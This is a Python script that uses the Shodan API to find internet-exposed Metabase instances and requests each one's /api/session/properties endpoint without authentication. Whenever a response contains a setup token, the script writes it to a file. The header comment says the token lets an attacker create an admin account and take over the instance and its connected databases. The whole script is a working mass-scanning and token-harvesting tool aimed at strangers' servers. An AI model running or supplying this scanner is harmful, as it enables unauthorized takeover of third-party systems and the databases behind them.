#!/usr/bin/env python3
#
# metabase.py
# Search SHODAN for Metabase instances exposing /api/session/properties
# without authentication. On unconfigured instances the response contains the
# setup token — enough to create a new admin account and take over the
# instance and every database connected to it.
#
# Author: random_robbie

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import get_api_key, open_output

import shodan
import requests

# Configuration
SEARCH_FOR = 'http.title:"Metabase"'
PROPS_PATH = "/api/session/properties"
CFG_DIR = "cfg"
session = requests.Session()


def grab_properties(ip, port):
    """Check whether session properties (and any setup token) leak unauthenticated."""
    print("[*] Testing: " + ip + " on Port: " + port + "[*]\n")
    try:
        url = "http://" + ip + ":" + port + PROPS_PATH
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Connection": "close",
            "Accept": "application/json",
        }
        response = session.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200 and "setup-token" in response.text:
            with open_output(os.path.join(CFG_DIR, ip + "-metabase.json"), "a") as fh:
                fh.write(response.text + "\n")
            print("[*] Metabase setup token exposed Whooops.. [*]\n")
        else:
            print("[*] Metabase configured or requires authentication. [*]\n")
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        print(e)
        print("[*] Nothing Found on IP:" + ip + " [*]\n")


def main():
    api = shodan.Shodan(get_api_key())
    result = api.search(SEARCH_FOR)
    for service in result["matches"]:
        grab_properties(service["ip_str"], str(service["port"]))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        sys.exit("Error: %s" % e)
